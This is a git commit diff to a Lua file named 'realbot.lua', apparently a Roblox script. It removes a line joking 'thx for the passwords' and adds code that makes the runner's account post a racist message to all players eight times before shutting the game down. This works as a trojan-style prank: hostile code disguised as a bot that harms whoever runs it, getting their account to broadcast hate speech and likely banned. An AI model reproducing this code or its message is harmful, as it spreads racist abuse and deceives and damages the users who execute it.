543349959eeff8517154f209c5fbb319bf316b0c
TheRealKazuma <104580955+TheRealKazuma@users.noreply.github.com>
2022-11-07 18:31:22 +0100

    Update realbot.lua

--- realbot.lua
+++ realbot.lua
@@ -1,4 +1,57 @@
-rconsoleprint("thx for the passwords <3 ^-^")
+local args = {
+    [1] = "i hate btlack people👳🏿",
+    [2] = "All"
+}
 
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "i hate btlack people👳🏿",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "i hate btlack people👳🏿",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "i hate btlack people👳🏿",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "i hate btlack people👳🏿",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "i hate btlack people👳🏿",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "i hate btlack people👳🏿",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait()
+local args = {
+    [1] = "i hate btlack people👳🏿",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
 wait(5)
 game:Shutdown()
